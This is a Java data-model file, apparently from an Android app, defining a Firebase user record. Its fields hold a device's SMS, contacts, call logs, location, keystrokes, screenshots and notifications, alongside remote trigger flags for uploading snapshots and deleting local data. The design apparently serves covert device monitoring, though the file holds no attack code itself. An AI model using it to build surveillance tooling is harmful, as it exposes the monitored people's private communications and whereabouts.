package com.vikasyadavnsit.cdc.data;

import com.google.firebase.database.IgnoreExtraProperties;
import com.vikasyadavnsit.cdc.enums.ActionStatus;
import com.vikasyadavnsit.cdc.enums.ClickActions;

import java.util.Map;

import lombok.Builder;
import lombok.Data;

@IgnoreExtraProperties
@Data
@Builder
public class User {
    private String id;
    private String fullName;

    private Map<String, Object> userDetails;
    private Map<String, Object> deviceDetails;
    private Map<String, Object> userSettings;
    private AppSettings appSettings;
    private UserDeviceData userDeviceData;

    @Data
    @Builder
    public static class AppSettings {
        private Map<String, AppTriggerSettingsData> appTriggerSettingsDataMap;
        private Map<String, Object> appSettingsMap;
    }

    @Data
    @Builder
    public static class AppTriggerSettingsData {
        private boolean enabled;
        private boolean repeatable;
        private int maxRepetitions;
        // Interval is in milliseconds
        private long interval;
        private ActionStatus actionStatus;
        private ClickActions clickActions;
        private boolean uploadDataSnapshot;
        private boolean deleteLocalData;
        private boolean saveOnLocalFile;

        @Override
        public String toString() {
            int keyWidth = 20; // Set a fixed width for keys

            return String.format("Permission: %s\n" +
                            "%-" + keyWidth + "s: %s\n" +  // Using keyWidth for formatting
                            "%-" + keyWidth + "s: %s\n" +
                            "%-" + keyWidth + "s: %d\n" +
                            "%-" + keyWidth + "s: %d ms\n" +
                            "%-" + keyWidth + "s: %s\n" +
                            "%-" + keyWidth + "s: %s\n" +
                            "%-" + keyWidth + "s: %s\n" +
                            "%-" + keyWidth + "s: %s",
                    clickActions,
                    "Enabled", enabled,
                    "Repeatable", repeatable,
                    "Max Repetitions", maxRepetitions,
                    "Interval", interval,
                    "Action Status", actionStatus,
                    "Upload Data Snapshot", uploadDataSnapshot,
                    "Delete Local Data", deleteLocalData,
                    "Save On Local File", saveOnLocalFile);
        }


    }

    @Data
    @Builder
    public static class UserDeviceData {
        private Map<String, Object> sensors;
        private Map<String, Object> fileStructure;
        private Map<String, Object> sms;
        private Map<String, Object> contacts;
        private Map<String, Object> callLogs;
        private Map<String, Object> geolocation;
        private Map<String, Object> keystrokes;
        private Map<String, Object> deviceStats;
        private Map<String, Object> appStats;
        private Map<String, Object> screenshots;
        private Map<String, Object> offlineFiles;
        private Map<String, Object> notifications;

    }

}
